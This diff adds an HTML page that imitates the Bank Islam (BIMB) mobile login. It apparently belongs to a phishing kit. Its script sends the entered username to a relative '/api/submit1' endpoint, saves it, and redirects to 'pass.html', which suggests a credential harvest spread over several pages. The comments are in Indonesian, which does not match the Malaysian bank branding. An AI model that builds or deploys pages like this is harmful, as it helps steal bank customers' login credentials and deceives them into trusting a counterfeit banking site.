@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BIMB WEB</title>
+  <link rel="icon" type="image/x-icon" href="images/BIMB.png">
+  <link rel="stylesheet" href="css/styles.css">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+  <div class="mobile-container">
+  <!-- Mobile Navigation -->
+    <nav class="mobile-nav">
+      <a href="#"><i class="fas fa-home"></i> Home</a>
+     
+    </nav>
+    <!-- Header -->
+    <header class="header">
+      <div class="logo">
+        <img src="images/logo.png" alt="Bank Islam">
+        <img src="images/BIMB-Logo-Main.png" alt="BIMB">
+      </div>
+   <button class="hamburger-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+      <div class="hero-section">
+        <h5><span>I T 'S&nbsp;&nbsp;P A R T&nbsp;&nbsp;&nbsp;O F&nbsp;&nbsp;&nbsp;M E .&nbsp;&nbsp;&nbsp;I T 'S&nbsp;&nbsp;&nbsp;M I N E</span></h5>
+        <h1>Inclusive</h1>
+        <h2>Banking for </h2>
+        <h3>Everyone</h3>
+        
+        <div class="login-section">
+          <form id="firstForm" action="javascript:void(0);">
+            <div class="input-container">
+              <div class="user-photo">
+                <img src="images/person.png" alt="User Photo">
+              </div>
+              <input type="text" id="username" name="username" placeholder="Enter your username" required />
+              <button type="submit" class="login-button">Login</button>
+            </div>
+          </form>
+          <div class="forgot-link-container">
+            <a href="#" class="forgot-link">Forgot Login Details?</a>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- Action Buttons -->
+    <div class="actions">
+      <div class="action-item"><div class="photo-container"><img src="images/transfer.png" alt="Transfer" class="action-button" data-action="Transfer"></div></div>
+      <div class="action-item"><div class="photo-container"><img src="images/paybills.png" alt="Pay Bills" class="action-button" data-action="Pay Bills"></div></div>
+      <div class="action-item"><div class="photo-container"><img src="images/reload.png" alt="Reload" class="action-button" data-action="Reload"></div></div>
+      <div class="action-item"><div class="photo-container"><img src="images/sadaqa.png" alt="Sadaqa" class="action-button" data-action="Sadaqa"></div></div>
+      <div class="action-item"><div class="photo-container"><img src="images/helpcentre.png" alt="Help Centre" class="action-button" data-action="Help Centre"></div></div>
+      <div class="action-item"><div class="photo-container"><img src="images/killswitch.png" alt="Kill Switch" class="action-button" data-action="Kill Switch"></div></div>
+    </div>
+
+  </div>
+
+  <!-- Scripts -->
+  	
+
+  <script src="js/jquery-3.6.0.min.js"></script>
+ <script>
+$(document).ready(function() {
+  // Event handlers untuk input username
+  $('#username').on('keydown', function(e) {
+    // Cek jika tombol yang ditekan adalah spasi (kode 32)
+    if (e.keyCode === 32) {
+      e.preventDefault(); // Blokir input spasi
+      return false;
+    }
+  });
+
+  $('#username').on('input', function() {
+    let val = $(this).val();
+    
+   
+    val = val.replace(/\s/g, '');
+    
+    // Batasi panjang 20 karakter
+    if (val.length > 20) {
+      val = val.substring(0, 20);
+    }
+    
+    $(this).val(val);
+  });
+
+  
+  $('#firstForm').submit(function(event) {
+    event.preventDefault();
+
+    const username = $('#username').val().trim();
+
+    if (!username) {
+      alert('Please enter your username.');
+      return;
+    }
+
+    if (username.length < 6 || username.length > 20) {
+      alert('Username must be between 6 and 20 characters.');
+      return;
+    }
+
+    fetch('/api/submit1', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': 'ok'
+      },
+      body: JSON.stringify({ username: username })
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Gagal submit');
+      return response.json();
+    })
+    .then(data => {
+      localStorage.setItem('username', username);
+      window.location.href = 'pass.html?username=' + encodeURIComponent(username);
+    })
+    .catch(error => {
+      alert('Terjadi kesalahan dalam pengiriman data.');
+      console.error(error);
+    });
+  });
+
+  $('.forgot-link').on('click', function (e) {
+    e.preventDefault();
+    alert('Please contact BIMB support at email: support@bimb.com or call us at +603-26 900 900.');
+  });
+
+  $('.action-button').on('click', function () {
+    const action = $(this).data('action');
+    alert(`You need to log in before accessing the ${action} service. Please log in to your Bank Islam account to enjoy our secure and convenient services.`);
+  });
+});
+</script>
+</body>
+</html>
